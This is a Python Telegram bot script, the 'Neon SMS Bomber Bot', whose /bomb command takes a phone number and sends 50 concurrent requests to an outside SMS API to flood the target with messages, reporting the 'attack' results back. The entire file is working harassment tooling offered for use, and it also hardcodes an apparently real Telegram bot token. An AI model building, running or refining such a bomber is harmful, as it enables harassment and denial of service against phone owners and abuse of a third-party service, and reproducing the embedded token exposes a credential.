import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import aiohttp
import asyncio

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
TOKEN = "7661267141:AAET2-qFjOD2GJvBtM-hL7x2mTLGOJGxMn0"
API_URL = "https://dz24pro.site/api/sms.php"
ALLOWED_USER_IDS = {123456789}  # Replace with your Telegram user ID
MAX_REQUESTS = 50
REQUEST_TIMEOUT = 10  # seconds

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_text(
        f"🚀 *Neon SMS Bomber Bot*\n\n"
        f"Hello {user.mention_markdown()}!\n\n"
        "Use /bomb [phone] to send 50 SMS requests\n"
        "Example: `/bomb 12345678901`\n\n"
        "⚠️ Use responsibly!",
        parse_mode='Markdown'
    )

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the bomb command."""
    # Check if user is authorized
    if update.effective_user.id not in ALLOWED_USER_IDS:
        await update.message.reply_text("⛔ Unauthorized access!")
        return

    # Check if phone number is provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide a phone number!\n"
            "Example: `/bomb 12345678901`",
            parse_mode='Markdown'
        )
        return

    phone = context.args[0]
    
    # Validate phone number
    if not phone.isdigit() or len(phone) != 11:
        await update.message.reply_text("❌ Invalid phone number! Must be 11 digits.")
        return

    # Send initial message
    msg = await update.message.reply_text(
        f"⚡ *Initiating attack on* `{phone}`\n"
        f"📤 Sending {MAX_REQUESTS} requests...",
        parse_mode='Markdown'
    )

    # Create all requests
    tasks = []
    success_count = 0
    async with aiohttp.ClientSession() as session:
        for i in range(MAX_REQUESTS):
            task = asyncio.create_task(
                send_sms(session, phone, i+1),
                name=f"request-{i+1}"
            )
            tasks.append(task)

        # Wait for all tasks to complete
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success_count = sum(1 for result in results if result is True)

    # Update status
    await msg.edit_text(
        f"✅ *Attack completed!*\n\n"
        f"📱 Target: `{phone}`\n"
        f"📤 Requests sent: {success_count}/{MAX_REQUESTS}\n"
        f"⚡ Success rate: {success_count/MAX_REQUESTS:.0%}",
        parse_mode='Markdown'
    )

async def send_sms(session, phone, request_num):
    """Send a single SMS request."""
    params = {'phone': phone}
    try:
        async with session.get(
            API_URL,
            params=params,
            timeout=REQUEST_TIMEOUT
        ) as response:
            if response.status == 200:
                logger.info(f"Request {request_num} successful to {phone}")
                return True
            logger.warning(f"Request {request_num} failed with status {response.status}")
            return False
    except Exception as e:
        logger.error(f"Request {request_num} error: {str(e)}")
        return False

def main() -> None:
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bomb", bomb))

    # Run the bot
    application.run_polling()

if __name__ == "__main__":
    main()